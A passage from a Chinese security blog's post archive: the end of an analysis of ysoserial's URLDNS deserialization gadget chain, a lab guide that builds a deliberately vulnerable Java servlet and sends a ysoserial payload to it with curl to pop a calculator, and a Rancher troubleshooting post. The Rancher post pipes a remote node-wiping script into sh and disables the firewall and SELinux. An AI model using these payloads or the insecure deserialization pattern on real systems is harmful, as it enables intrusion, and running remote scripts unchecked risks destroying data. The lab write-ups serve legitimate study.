<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/image-20211116211130053.png" alt="image-20211116211130053"></p>
<h2 id="getAllByName0"><a href="#getAllByName0" class="headerlink" title="getAllByName0()"></a>getAllByName0()</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> InetAddress[] getAllByName0 (String host, InetAddress reqAddr, <span class="type">boolean</span> check)</span><br><span class="line">    <span class="keyword">throws</span> UnknownHostException  &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* If it gets here it is presumed to be a hostname */</span></span><br><span class="line">    <span class="comment">/* Cache.get can return: null, unknownAddress, or InetAddress[] */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* make sure the connection to the host is allowed, before we</span></span><br><span class="line"><span class="comment">     * give out a hostname</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (check) &#123;<span class="comment">//先判断连接是否被允许</span></span><br><span class="line">        <span class="type">SecurityManager</span> <span class="variable">security</span> <span class="operator">=</span> System.getSecurityManager();</span><br><span class="line">        <span class="keyword">if</span> (security != <span class="literal">null</span>) &#123;</span><br><span class="line">            security.checkConnect(host, -<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    InetAddress[] addresses = getCachedAddresses(host);<span class="comment">//从缓存中查找域名对应的IP地址</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* If no entry in cache, then do the host lookup */</span></span><br><span class="line">    <span class="keyword">if</span> (addresses == <span class="literal">null</span>) &#123;<span class="comment">//如果缓存中没有记录</span></span><br><span class="line">        addresses = getAddressesFromNameService(host, reqAddr);<span class="comment">//发起DNS请求</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (addresses == unknown_array)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnknownHostException</span>(host);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> addresses.clone();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从上述代码，我们能够发现，<code>getAddressesFromNameService()</code>就是最终发起DNS请求的方法。</p>
<h2 id="getAddressesFromNameService"><a href="#getAddressesFromNameService" class="headerlink" title="getAddressesFromNameService()"></a>getAddressesFromNameService()</h2><p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/image-20211116211837716.png" alt="image-20211116211837716"></p>
<h1 id="简易利用链分析-Java-1-8"><a href="#简易利用链分析-Java-1-8" class="headerlink" title="简易利用链分析(Java 1.8)"></a>简易利用链分析(Java 1.8)</h1><p>Java1.8和1.7虽然代码有些许区别，但是最后也是会到hash()方法，然后接下来的链都是一样的</p>
<blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HashMap-&gt;readObject</span><br><span class="line">HashMap-&gt;putval</span><br><span class="line">HashMap-&gt;hash</span><br><span class="line">URL-&gt;hashCode</span><br><span class="line">URLStreamHandler-&gt;hashCode</span><br><span class="line">URLStreamHandler-&gt;getHostAddress</span><br><span class="line">    .....</span><br></pre></td></tr></table></figure>
</blockquote>
<p>此处就不演示了。</p>
<h1 id="Ysoserial中的利用链"><a href="#Ysoserial中的利用链" class="headerlink" title="Ysoserial中的利用链"></a>Ysoserial中的利用链</h1><h2 id="巧妙的SilentURLStreamHandler"><a href="#巧妙的SilentURLStreamHandler" class="headerlink" title="巧妙的SilentURLStreamHandler"></a>巧妙的SilentURLStreamHandler</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Object&gt; &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">                <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();<span class="comment">//avoid any DNS resolution</span></span><br><span class="line"></span><br><span class="line">                <span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); </span><br><span class="line">                <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler); </span><br><span class="line">                ht.put(u, url); </span><br><span class="line">                Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> ht;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                PayloadRunner.run(URLDNS.class, args);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title class_">URLStreamHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Ysoserial</strong>并没有像我们之前看到的简易利用链那样去用反射的方法在<code>hashmap.put</code>前修改hashCode的值，相反它用了一个非常聪明的办法：<strong>重写handler</strong>。</p>
<p><code>SilentURLStreamHandler</code>继承了<code>URLStreamHandler</code>（因为后者是abstract，不能被创建instance），里面包含两个method，一个是<code>openConnection</code> 一个是<code>getHostAddress</code></p>
<p>其中<code>getHostAddress ()</code>我们非常熟悉，复习下之前的原生态<strong>getHostAddress</strong>的内容：</p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/image-20211116214214813.png" alt="image-20211116214214813"></p>
<p>在正常的利用链中，我们是会从getByName()一层层执行下去的，然而Ysoserial直接复写<code>getHostAddress()</code>,让他返回null,因此生成hashMap的时候利用链是不完整的，也就不会触发<strong>DNS请求</strong>。</p>
<h2 id="生成HashMap与URL"><a href="#生成HashMap与URL" class="headerlink" title="生成HashMap与URL"></a>生成HashMap与URL</h2><p>创建<strong>HashMap</strong>后，我们需要把URL放进hashmap中， 因为我们已经创建了一个handler，所以我们需要把handler赋给新创建的URL。</p>
<p>在URL的<strong>constructor</strong>中，我们可以看到，<code>URLStreamHandler</code>是可以自定义的</p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/image-20211116214812588.png" alt="image-20211116214812588"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line"><span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">ht.put(u, url); <span class="comment">//value可以为任何值，这里Ysoserial把value设置为了我们的URLDNS接收的网址(url)</span></span><br></pre></td></tr></table></figure>

<p>在<strong>hashmap</strong>的<strong>put</strong>完成后，过程中<strong>hashCode</strong>肯定还会变化（即使在检测<strong>hashCode!=-1</strong>的步骤那里我们满足了条件），我们仍需要将他改回**-1**，以便server在执行反序列化的时候，我们的payload可以生效。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<h2 id="序列化时的问题"><a href="#序列化时的问题" class="headerlink" title="序列化时的问题"></a>序列化时的问题</h2><p>我们刚刚提到，Ysoserial重写了**getHostAddress()**方法，那我们序列化后的object岂不是也是用这个复写后的方法，服务器进行反序列化时就不会触发URLDNS了？</p>
<p>Ysoserial也解释了这一点：</p>
<blockquote>
<p>Since the field <code>java.net.URL.handler</code> is transient, it will not be part of the serialized payload.</p>
</blockquote>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/image-20211116220202861.png" alt="image-20211116220202861"></p>
<p>因为<strong>transient</strong>的存在，<strong>Ysoserial</strong>覆写的<strong>handler</strong>不会被序列化，因此我们的<strong>payload</strong>依然是可以被<strong>有效反序列化并触发</strong>的！</p>
<h2 id="利用实现"><a href="#利用实现" class="headerlink" title="利用实现"></a>利用实现</h2><p>这里我依然使用<a href="https://leihehehe.github.io/2021/09/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BYsoserial%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE-6/">Java反序列化漏洞之使用Ysoserial(6)</a>中所搭建的web环境(java1.7)。</p>
<p>在Ysoserial中配置：</p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/image-20211116221349850.png" alt="image-20211116221349850"></p>
<p><strong>注意：在之前的分析中提到过，我们需要加上协议(http://)</strong></p>
<p><strong>Serializer.java：</strong></p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/image-20211116221003206.png" alt="image-20211116221003206"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl http://localhost:9090/webTest1_Web_exploded/test --data-binary @payload.ser</span><br></pre></td></tr></table></figure>

<p>刷新URLDNS平台后成功收到记录：</p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/image-20211116221323622.png" alt="image-20211116221323622"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><strong>URLDNS</strong>利用链从<strong>HashMap</strong>入手，到URL类自身的一系列<strong>methods</strong>连成利用链，包括<strong>Ysoserial</strong>对<strong>Handler</strong>的覆写和<strong>transient</strong>的理解，都十分巧妙。</p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="http://wjlshare.com/archives/1493">Java反序列化-URLDNS</a></p>
<p><a href="https://www.guildhab.top/2020/08/java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E6-%E8%A7%A3%E5%AF%86-ysoserial-urldns-pop-chain/">Java 反序列化漏洞(6) – 解密 YSoSerial : URLDNS POP Chain</a></p>
<p><a href="https://saucer-man.com/information_security/647.html#cl-3">java urldns利用链分析</a></p>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>Java Deserialization</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>Java Deserilization</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化漏洞之使用Ysoserial(6)</title>
    <url>/2021/09/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BYsoserial%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE-6/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<p><strong>ysoserial是</strong>一款在Github开源的知名java 反序列化利用工具，里面集合了各种java反序列化payload； 由于其中部分payload使用到的低版本JDK中的类，所以建议自己私下分析学习时使用低版本JDK，JDK版本建议在1.7u21以下</p>
</blockquote>
<span id="more"></span>

<h1 id="YsoSerial环境搭建"><a href="#YsoSerial环境搭建" class="headerlink" title="YsoSerial环境搭建"></a>YsoSerial环境搭建</h1><p>首先下载<strong>ysoserial</strong>：<code>git clone https://github.com/frohoff/ysoserial.git</code></p>
<p>用IDEA加载后，打开<code>pom.xml</code>文件，打开后Maven会自动下载对应的依赖，但有些依赖无法下载成功。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mvn install:install-file -DgroupId=依赖的groupId -DartifactId=依赖的artifactId -Dversion=依赖的版本 -Dpackaging=jar -Dfile=你下载的jar包的路径</span><br></pre></td></tr></table></figure>

<p>IDEA里JDK配置成1.7</p>
<p>运行<code>GeneratePayload.java</code>，出现以下信息表示YsoSerial环境搭建成功</p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BYsoserial%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE-6/image-20210906180526562.png" alt="image-20210906180526562"></p>
<h1 id="使用YSoSerial生成序列化字符"><a href="#使用YSoSerial生成序列化字符" class="headerlink" title="使用YSoSerial生成序列化字符"></a>使用YSoSerial生成序列化字符</h1><p>在之前的图中，我们可以看到它的使用方法</p>
<p><code>Usage: java -jar ysoserial-[version]-all.jar [payload] &#39;[command]&#39;</code></p>
<p>此处我们使用IDEA运行程序，所以可以省略前面的 <code>java -jar ysoserial-[version]-all.jar</code></p>
<p>在配置中写入arguments - Windows环境下运行计算器<code>calc</code></p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BYsoserial%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE-6/image-20210907140711586.png" alt="image-20210907140711586"></p>
<p>即可生成以下序列化字符串(payload)</p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BYsoserial%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE-6/image-20210906181130800.png" alt="image-20210906181130800"></p>
<p>但该payload无法直接复制,所以我们想办法用writeObject()将他写成二进制文件（在<a href="https://leihehehe.github.io/2021/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E4%B8%8E%E5%88%86%E6%9E%90-3/">Java反序列化漏洞之Java反序列化流程与分析(3)</a>中学习过）。</p>
<p>在<code>GeneratePayload</code>中有以下代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">	<span class="keyword">final</span> <span class="type">ObjectPayload</span> <span class="variable">payload</span> <span class="operator">=</span> payloadClass.newInstance();</span><br><span class="line">	<span class="keyword">final</span> <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> payload.getObject(command);</span><br><span class="line">	<span class="type">PrintStream</span> <span class="variable">out</span> <span class="operator">=</span> System.out;<span class="comment">//system out</span></span><br><span class="line">	Serializer.serialize(object, out);<span class="comment">//将序列化payload打出来</span></span><br><span class="line">	ObjectPayload.Utils.releasePayload(payload, object);</span><br><span class="line">&#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">	System.err.println(<span class="string">&quot;Error while generating or serializing payload&quot;</span>);</span><br><span class="line">	e.printStackTrace();</span><br><span class="line">	System.exit(INTERNAL_ERROR_CODE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们跟进<code>serialize()</code>方法，发现是在<code>Serializer</code>Class中。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> OutputStream out)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">	<span class="keyword">final</span> <span class="type">ObjectOutputStream</span> <span class="variable">objOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(out);</span><br><span class="line">	objOut.writeObject(obj);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//for saving in the file.</span></span><br><span class="line">       <span class="comment">//将payload写到文件</span></span><br><span class="line"></span><br><span class="line">       <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;payload.ser&quot;</span>);</span><br><span class="line">       ObjectOutputStream objectOutputStream=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">       objectOutputStream.writeObject(obj);</span><br><span class="line">       fileOutputStream.flush();</span><br><span class="line">       fileOutputStream.close();</span><br><span class="line">       objectOutputStream.flush();</span><br><span class="line">       objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>payload保存到文件成功。</p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BYsoserial%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE-6/image-20210906224304869.png" alt="image-20210906224304869"></p>
<h1 id="WebServer环境搭建"><a href="#WebServer环境搭建" class="headerlink" title="WebServer环境搭建"></a>WebServer环境搭建</h1><p><strong>配置环境：java1.7，commoncollections3.1.jar</strong></p>
<p>首先Java中新建Maven项目</p>
<p>在Project Structure中导入Web框架</p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BYsoserial%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE-6/image-20210906231359407.png" alt="image-20210906231359407"></p>
<p>在main文件夹下创建一个Servlet</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletInputStream;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">ServletInputStream</span> <span class="variable">servletInputStream</span> <span class="operator">=</span> req.getInputStream();<span class="comment">//相当于之前的FileInputStream,不过数据现在是来源于ServletInputStream而不是从文件读取了</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(servletInputStream);<span class="comment">//从ServletInputStream中读取ObjectStream</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            objectInputStream.readObject();<span class="comment">//读入object</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        objectInputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果出现servlet找不到的情况，按提示下载即可</p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BYsoserial%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE-6/image-20210906232006712.png" alt="image-20210906232006712"></p>
<p>设置<strong>Router</strong>：访问<code>/test</code>的时候交给<code>MainServlet</code>处理</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>MainServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>MainServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>MainServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/test<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>为了复现<code>commoncollections1</code>, jdk版本需要为<code>1.7</code>，且需导入<code>commons-collections-3.1.jar</code></p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BYsoserial%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE-6/image-20210906233044231.png" alt="image-20210906233044231"></p>
<p>同时在<code>artifact</code>处需要导入commons collections，否则漏洞复现时会提示找不到库。</p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BYsoserial%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE-6/image-20210907135825600.png" alt="image-20210907135825600"></p>
<p>若出现<code>Error:java: invalid source release: 8</code>这样的错误，可检查下面几处设置中sdk是否为统一的版本（此处应为1.7）</p>
<blockquote>
<ul>
<li>File -&gt; Project Structure -&gt; Project Settings</li>
<li>File -&gt; Project Structure -&gt; Module Settings -&gt; Tab: Sources: Language Level</li>
<li>File -&gt; Project Structure -&gt; Module Settings -&gt; Tab: Dependencies: Module SDK</li>
<li>File -&gt; Settings -&gt; Compiler -&gt; Java Compiler -&gt; Target bytecode version</li>
</ul>
</blockquote>
<p>运行如下图</p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BYsoserial%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE-6/image-20210907113720745.png" alt="image-20210907113720745"></p>
<h1 id="攻击实现"><a href="#攻击实现" class="headerlink" title="攻击实现"></a>攻击实现</h1><p>现在，已知我们搭建的网站是有反序列化漏洞的，我们用<code>curl</code>发送我们之前生成的序列化二进制文件</p>
<p><code>curl http://localhost:9090/webTest1_Web_exploded/test --data-binary @payload.ser</code></p>
<blockquote>
<p><strong>注意 : 通过 Curl 发送二进制文件时 , 需要在文件路径前加上 <code>@</code> 符号 , 此时文件中所有的回车符和换行符都将被自动转换 .</strong></p>
</blockquote>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BYsoserial%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE-6/image-20210907135903851.png" alt="image-20210907135903851"></p>
<p>计算器被成功执行！</p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://stackoverflow.com/questions/25878045/errorjava-invalid-source-release-8-in-intellij-what-does-it-mean">Error:java: invalid source release: 8 in Intellij. What does it mean?</a></p>
<p><a href="https://www.guildhab.top/2020/07/java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E5-%E8%A7%A3%E5%AF%86-ysoserial-java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E6%9C%BA%E5%88%B6/">Java 反序列化漏洞(5) – 解密 YSoSerial : Java动态代理机制</a></p>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>Java Deserialization</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>Java Deserialization</tag>
      </tags>
  </entry>
  <entry>
    <title>Rancher Resolved Issues</title>
    <url>/2022/08/21/Rancher-resolved-issues/</url>
    <content><![CDATA[<h1 id="Rancher-Problems-and-Solutions"><a href="#Rancher-Problems-and-Solutions" class="headerlink" title="Rancher Problems and Solutions"></a>Rancher Problems and Solutions</h1><h2 id="Quickly-Clean-a-Node"><a href="#Quickly-Clean-a-Node" class="headerlink" title="Quickly Clean a Node"></a>Quickly Clean a Node</h2><p>Nodes need to be cleaned completely, use the following script.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl https://gist.githubusercontent.com/Ileriayo/1bef407602208911e86f42d5d208c1fb/raw/af8fa882add9c0a7ccd72b92f1cfab5c95c355ba/nuke_rancher_kube_node.sh | sh</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h2 id="Waiting-for-API-Readey-False-xxx-mins-ago-Disconnected-Cluster-agent-is-not-connected"><a href="#Waiting-for-API-Readey-False-xxx-mins-ago-Disconnected-Cluster-agent-is-not-connected" class="headerlink" title="Waiting for API [Readey False xxx mins ago [Disconnected] Cluster agent is not connected]"></a>Waiting for API [Readey False xxx mins ago [Disconnected] Cluster agent is not connected]</h2><p>The newest version of rancher brought this error to me, I’m not sure about the cause.</p>
<blockquote>
<p>Waiting for API [Readey False xxx mins ago [Disconnected] Cluster agent is not connected].</p>
</blockquote>
<p><strong>Solution</strong></p>
<ul>
<li>What I used: changed <strong>Rancher</strong> to <strong>2.5.15(2.5x stable version)</strong>, choose <strong>19.x Kubernetes</strong></li>
<li>Another method suggested by others (but not working for me)<ul>
<li><a href="https://github.com/rancher/rancher/issues/36589">https://github.com/rancher/rancher/issues/36589</a></li>
</ul>
</li>
</ul>
<h2 id="Waiting-for-Kubernetes-API-to-be-available"><a href="#Waiting-for-Kubernetes-API-to-be-available" class="headerlink" title="Waiting for Kubernetes API to be available"></a>Waiting for Kubernetes API to be available</h2><p><strong>Solution</strong></p>
<ul>
<li><p>Setting up hosts for all nodes.</p>
<ul>
<li>```bash<br>hostnamectl set-hostname node1<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- Writing <span class="built_in">to</span> <span class="keyword">the</span> `hosts` <span class="built_in">file</span>  <span class="keyword">for</span> all nodes</span><br><span class="line"></span><br><span class="line">  - ```bash</span><br><span class="line">    vi /etc/hosts</span><br><span class="line">    <span class="comment">#192.168.2.121 node1</span></span><br><span class="line">    <span class="comment">#192.168.2.122 node2</span></span><br><span class="line">    <span class="comment">#192.168.2.123 node3</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>Shut down <strong>firewall</strong>, <strong>selinux</strong>, and <strong>swap</strong></p>
<ul>
<li><pre><code class="bash">sudo systemctl stop firewalld
sudo systemctl disable firewalld

#shut selinux： 
sed -i &#39;s/enforcing/disabled/&#39; /etc/selinux/config
setenforce 0

#shut swap：
swapoff -a  
sed -ri &#39;s/.*swap.*/#&amp;/&#39; /etc/fstab 
</code></pre>
</li>
</ul>
</li>
</ul>
